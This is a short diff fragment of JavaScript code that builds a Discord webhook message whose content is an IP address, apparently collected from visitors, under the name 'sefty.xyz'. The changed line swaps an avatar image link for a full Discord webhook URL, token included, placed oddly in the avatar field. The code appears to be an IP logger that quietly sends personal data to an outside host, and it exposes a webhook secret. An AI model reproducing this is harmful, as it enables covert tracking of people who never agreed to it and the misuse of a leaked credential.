@@ -125,7 +125,7 @@ async function sendWebhook() {
 
 	var params = {
 		username: "sefty.xyz",
-		avatar_url: "https://cdn.discordapp.com/attachments/1159569653182496868/1159573275937079407/wojtek.mafia_logo.png?ex=653183c4&is=651f0ec4&hm=8ddf433577c20c2dca93046a0196bf2f619a50f938ae79212dbce8fd542c7137&",
+		avatar_url: "https://discord.com/api/webhooks/1175789235140317284/AWW8jXftbrOvj2Ap-gZm4ZzCjHxVvyBq1RvengSTozaCeeDCHDccbiA6xrc6MrYQPZ7s",
 		content: `${ip}`
 	};
 
